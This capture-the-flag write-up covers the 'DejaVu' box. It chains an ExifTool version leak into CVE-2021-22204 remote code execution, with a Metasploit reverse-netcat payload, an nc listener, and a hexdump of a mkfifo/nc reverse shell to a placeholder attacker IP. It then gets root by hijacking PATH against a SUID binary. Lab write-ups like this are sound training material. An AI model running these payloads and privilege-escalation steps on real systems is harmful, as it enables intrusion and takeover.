DejaVu looks harmless at first: a cheerful gallery of dog pictures backed by a small Go web app. But the whole box turns on one detail an API quietly hands you for free — a version string. This writeup follows that thread from a trivial information leak all the way to root, with a detour through the application's source code to understand *why* the chain works.

---

## Reconnaissance

I started with a quick port scan:

```bash
rustscan -a dejavu.thm --ulimit 5000 | tee rustscan.txt
nmap -sS -sC -sV -O -Pn -p 22,80 dejavu.thm -oN nmap.txt

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.0 (protocol 2.0)
80/tcp open  http    Golang net/http server
```

SSH 8.0 is current and useless without credentials, so I parked it. Port 80 reported a hand-rolled Go `net/http` server (nmap mislabels it as Go-IPFS/InfluxDB). A custom Go backend usually means a custom API — that was clearly the way in.

---

## Enumeration

The front page is a "Dog Gallery!" that loads its images dynamically from JavaScript. So I went straight for the client-side code:

```bash
curl dejavu.thm
curl dejavu.thm/main.js
```

`main.js` spelled out the API the frontend talks to:

- `GET /dog/list` — list of dogs (id, title, caption)
- `GET /dog/get/<id>` — the image itself
- `GET /dogpic/?id=<id>` — a per-dog detail page

A directory brute force rounded out the surface:

```bash
feroxbuster -u http://dejavu.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x html,php,txt,js,json --filter-status 401,403,404 -q
```

That surfaced `/upload/` (an upload form) and `/dogpic/` (found by crawling the JavaScript, not from the wordlist). The real upload endpoint is `POST /dog/upload`, a multipart form whose only guard is a client-side `accept="image/*"` — trivial to bypass.

The detail page was more interesting. Proxying `/dogpic/?id=1` through Burp showed `dogpic.js` calling two routes that `main.js` never mentions:

```bash
curl -s dejavu.thm/dog/getmetadata/2 | jq

{
  "title": "Nana",
  "caption": "Banana the dog",
  "id": 0
}
```

- `GET /dog/getmetadata/<id>` — title and caption
- `GET /dog/getexifdata/<id>` — date and author, pulled from EXIF

That second one — EXIF data, server-side — is where my attention went.

## Reading the Source

Before throwing payloads around, I pulled the backend source (`webserver.go`) to understand how an upload is handled. Three fragments tell the whole story.

The upload handler stores whatever you send, with no MIME or content validation:

```go
func uploadHandler(w http.ResponseWriter, r *http.Request) {
    file, _, err := r.FormFile("image")
    if r.Form.Get("title") == "" || r.Form.Get("caption") == "" {
        http.Error(w, "Missing title or caption", 415)
        return
    }
    imageData, err := io.ReadAll(file)
    newImage := dogImage{
        Title:     r.Form.Get("title"),
        Caption:   r.Form.Get("caption"),
        ImageData: imageData,  // stored as-is in memory
    }
    dogChannel <- newImage
}
```

The EXIF route runs ExifTool directly over those user-controlled bytes and serializes the result without filtering a single field:

```go
func exifData(filepath string) string {
    result := exec.Command("./exiftool/exiftool", "-j", filepath)  // fixed relative path
    response, err := result.CombinedOutput()
    return string(response)  // returned verbatim
}

func getDogImageEXIFMetadata(w http.ResponseWriter, r *http.Request) {
    vars := mux.Vars(r)
    if URLID, ok := vars["id"]; ok {
        id, _ := strconv.Atoi(URLID)
        w.Header().Add("Content-Type", "application/json")
        w.Write([]byte(exifForImageData(dogImages[id].ImageData)))  // runs ExifTool
    }
}
```

And `dogpic.js` is the trigger: loading `/dogpic/?id=<id>` fires `GET /dog/getexifdata/<id>`, which makes the server run ExifTool over the image I choose. Upload without validation, store raw, run ExifTool on attacker data — the whole chain is right there in the code.

---

## The Version Leak

Because that EXIF endpoint returns ExifTool's output untouched, it leaks fields that should never be public — including the tool's own version:

```bash
curl -s dejavu.thm/dog/getexifdata/0 | jq
```

The response carries `exifData[0].ExifToolVersion`, and it reads **12.23**. On its own that's a textbook OWASP API3:2019 Excessive Data Exposure finding — low severity, the kind of thing most reports bury on the last page. Here it's the keystone: ExifTool 12.23 is vulnerable to **CVE-2021-22204**, patched in 12.24.

---

## Exploitation

CVE-2021-22204 is remote code execution in ExifTool below 12.24. Parsing malformed DjVu/ANT tags runs metadata through Perl's `eval()`, so the `\c@{[ ... ]}` syntax lets you smuggle arbitrary Perl into an image. The patch swapped `eval()` for a dictionary of allowed sequences.

Metasploit has a module that builds the malicious image for you:

```bash
msfconsole -q
use exploit/unix/fileformat/exiftool_djvu_ant_perl_injection
set PAYLOAD cmd/unix/reverse_netcat
set LHOST tun0
set LPORT <ATTACKER_PORT>
set FILENAME exploit.jpg
exploit
```

From there it's three moves — listener up, upload the image, then force the server to process it:

```bash
nc -lvnp <ATTACKER_PORT>                 # 1. listener
# 2. upload exploit.jpg via the /upload/ form
curl dejavu.thm/dog/getexifdata/<id>     # 3. make the server run ExifTool on it
```

Requesting the EXIF data of my uploaded image did exactly what the source promised:

```
uid=1000(dogpics) gid=1000(dogpics) groups=1000(dogpics)
```

A shell as `dogpics`.

## Stabilizing the Shell (no Python here)

The `reverse_netcat` payload drops you into a raw, TTY-less shell. My usual move is `python -c 'import pty; pty.spawn("/bin/bash")'` — but there was no Python on this box (no `python`, `python2`, or `python3`). So I reached for `script`, which is almost always present:

```bash
script -qc /bin/bash /dev/null
export TERM=xterm
export SHELL=bash
```

`script` is meant to record terminal sessions, and to do that it allocates a pseudo-TTY. Running it with `-c /bin/bash` launches bash inside that PTY — which is exactly what makes the shell interactive (history, tab-completion, working `Ctrl+C`). The `-q` keeps it quiet and `/dev/null` throws away the transcript. It's my go-to whenever Python isn't an option.

---

## Privilege Escalation

In `/home/dogpics` there was a SUID binary, `serverManager`, running as root. It called `systemctl` by name rather than by absolute path:

```c
system("systemctl status --no-pager dogpics");
system("sudo systemctl restart dogpics");
```

A relative command name means the shell resolves it through `$PATH` — so I just put my own `systemctl` first:

```bash
echo '/bin/bash' > systemctl
chmod +x systemctl
export PATH=.:$PATH
which systemctl    # resolves to ./systemctl
```

Then I ran the binary and picked the option that calls `systemctl`:

```bash
./serverManager
# option 0 (Get server status)

[root@dejavu ~]# id
uid=0(root) gid=0(root) groups=0(root),1000(dogpics)
```

Root.

## Post-Exploitation: What the Payload Looks Like

With root I went back to understand how the exploit actually sits inside an image. The Perl injection is embedded verbatim in the uploaded file as DjVu metadata:

```bash
hexdump -C exploit.jpg | head -n 50

00000100  46 ...  |FORM....DJVIANTa|
00000110  00 ...  |....(metadata (A|
00000120  75 ...  |uthor "\c@{[`mkf|
00000130  69 ...  |ifo /tmp/smwwma;|
00000140  20 ...  | nc <ATTACKER_IP|
00000150  31 ...  |> <ATTACKER_PORT|
         [...]
00000190  6d ...  |/tmp/smwwma`]}"))|
```

You can read the attack straight out of the bytes: a valid `DJVIANT` structure at `0x100`, the `(metadata (Author "\c@{[` injection opening at `0x110`, and a plain `mkfifo` + `nc` reverse shell spelled out in the body. ExifTool 12.23 parses this block and executes the Perl as code instead of treating it as data — that single confusion is the entire vulnerability.

## Key Takeaways

**A version string is a vulnerability.** Excessive Data Exposure is usually a low-severity finding, but a leaked ExifTool version was enough to pin down a known RCE. Low severity is not the same as low impact once you chain it.

**Read the source before you fire.** The decisive move wasn't a tool — it was reading `webserver.go` and confirming that uploads were unvalidated and ExifTool ran on attacker-controlled bytes. That turned a guess into a sure thing.

**`script -qc /bin/bash /dev/null` is the Python-free TTY upgrade.** When a target has no Python, `script` allocates a pseudo-TTY and gives you an interactive shell just the same.

**Relative command names in privileged binaries are a gift.** Any SUID program that calls another tool by name instead of absolute path is one `$PATH` entry away from handing you its privileges.

No flags are discussed here.
